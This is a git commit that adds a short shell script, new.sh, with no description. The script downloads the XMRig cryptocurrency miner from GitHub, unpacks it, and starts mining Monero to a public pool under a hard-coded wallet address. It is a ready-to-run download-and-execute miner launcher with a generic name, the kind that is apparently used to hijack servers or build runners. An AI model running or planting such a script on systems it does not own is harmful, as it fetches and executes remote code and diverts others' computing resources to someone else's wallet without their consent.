5ab072ad8b442a33f6c7baa88d04b3121103ee94
Effie123 <48617095+Effie123@users.noreply.github.com>
2020-11-24 18:55:54 +0800

    Add files via upload

---
+++ new.sh
@@ -0,0 +1,4 @@
+wget https://github.com/xmrig/xmrig/releases/download/v6.5.3/xmrig-6.5.3-linux-static-x64.tar.gz
+tar -zxvf xmrig-6.5.3-linux-static-x64.tar.gz
+cd xmrig-6.5.3
+./xmrig -o us-west.minexmr.com:4444 -u 49GJAZ7nFaBbDHq2cyxBtk7eiN5unkTFrLhjsE66Q5je9kfaeT6uTZc241kAKFNH9aRh3NhaXSzN34JTUV7xXdH77XbtNMG -k --coin monero -a rx/0
